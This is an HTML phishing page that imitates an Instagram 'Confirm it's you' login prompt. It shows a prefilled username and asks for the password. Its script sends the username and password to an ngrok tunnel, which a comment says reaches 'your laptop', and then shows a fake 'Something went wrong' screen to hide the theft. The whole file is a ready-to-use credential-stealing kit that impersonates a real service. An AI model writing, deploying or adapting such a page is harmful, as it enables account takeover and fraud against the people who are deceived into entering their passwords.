<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    body { 
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
    }
    .insta-text {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      font-size: 42px;
      font-weight: 700;
      letter-spacing: -2px;
      background: linear-gradient(45deg, #f56040, #c13584, #405de6);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
  </style>
</head>
<body class="bg-[#f8f8f8] min-h-screen flex items-center justify-center">

  <div class="max-w-md w-full mx-auto bg-white border border-gray-300 rounded-3xl shadow-2xl overflow-hidden">

    <div class="flex flex-col items-center pt-10 pb-4">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" 
           alt="Instagram Logo" 
           class="h-20 w-20 mb-3">
      <div class="insta-text">Instagram</div>
    </div>

    <div id="form-screen" class="p-10 pt-4">
      <div class="text-center mb-8">
        <h2 class="text-3xl font-semibold text-black">Confirm it's you</h2>
        <p class="text-gray-600 mt-4 text-[17px] leading-relaxed">
          We noticed a new login attempt from a new device.<br>
          Enter your password to continue.
        </p>
      </div>

      <div class="mb-6">
        <div class="text-sm text-gray-500 mb-1">Username</div>
        <input 
          id="username-input"
          type="text" 
          value="gotnohoes_.11"
          class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:outline-none focus:border-blue-500 text-lg bg-white">
      </div>

      <form id="login-form">
        <div class="mb-2">
          <div class="text-sm text-gray-500 mb-1">Password</div>
          <input 
            id="password-input"
            type="password" 
            class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:outline-none focus:border-blue-500 text-lg"
            placeholder="Enter password"
            required>
        </div>

        <button 
          type="submit"
          id="login-btn"
          class="w-full bg-[#0095f6] hover:bg-[#0077c2] text-white font-semibold py-4 rounded-2xl mt-8 text-lg transition-all">
          Log in
        </button>
      </form>

      <div class="text-center text-sm text-blue-500 mt-6 cursor-pointer hover:underline">
        Forgot your password?
      </div>
    </div>

    <div id="error-screen" class="p-10 hidden">
      <div class="text-center">
        <div class="text-red-500 text-7xl mb-6">⚠️</div>
        <h2 class="text-3xl font-semibold mb-3">Something went wrong</h2>
        <p class="text-gray-600 text-lg leading-relaxed">
          We couldn't confirm it's you right now.<br>
          Please try again later.
        </p>

        <button 
          onclick="resetDemo()"
          class="mt-10 w-full bg-gray-100 hover:bg-gray-200 py-4 rounded-2xl font-semibold text-lg">
          Try again
        </button>
      </div>
    </div>
  </div>

  <script>
    const form = document.getElementById('login-form');
    const formScreen = document.getElementById('form-screen');
    const errorScreen = document.getElementById('error-screen');

    form.addEventListener('submit', function(e) {
      e.preventDefault();
      
      const username = document.getElementById('username-input').value;
      const password = document.getElementById('password-input').value;
      const btn = document.getElementById('login-btn');
      
      btn.innerHTML = 'Checking...';
      btn.disabled = true;

      // This part sends the data to your laptop via Ngrok
      fetch('https://belia-puristical-sophia.ngrok-free.dev/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: username, password: password })
      })
      .then(response => {
        setTimeout(() => {
          formScreen.classList.add('hidden');
          errorScreen.classList.remove('hidden');
          btn.innerHTML = 'Log in';
          btn.disabled = false;
        }, 1400);
      })
      .catch(error => {
        console.error('Error:', error);
        alert("Check if app.py and Ngrok are running!");
        btn.innerHTML = 'Log in';
        btn.disabled = false;
      });
    });

    function resetDemo() {
      formScreen.classList.remove('hidden');
      errorScreen.classList.add('hidden');
      document.getElementById('password-input').value = '';
    }
  </script>
</body>
</html>
